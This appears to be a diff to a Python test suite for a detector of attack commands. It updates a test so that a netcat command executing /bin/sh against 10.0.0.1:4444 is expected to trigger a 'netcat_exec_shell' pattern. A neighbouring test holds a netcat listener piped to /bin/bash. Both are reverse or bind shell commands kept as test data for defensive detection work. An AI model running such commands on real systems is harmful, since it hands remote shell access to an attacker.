@@ -144,9 +144,8 @@ class TestNetworkAttacks:
 
     def test_netcat_shell(self):
         result = check_tripwires("nc -e /bin/sh 10.0.0.1 4444")
-        # nc -e doesn't match current netcat_shell pattern (requires pipe to /bin/sh)
-        # This is a known gap — adversarial tests cover it
-        assert not result.triggered
+        assert result.triggered
+        assert result.pattern_name == "netcat_exec_shell"
 
     def test_netcat_pipe_shell(self):
         result = check_tripwires("nc -lvp 4444 | /bin/bash")
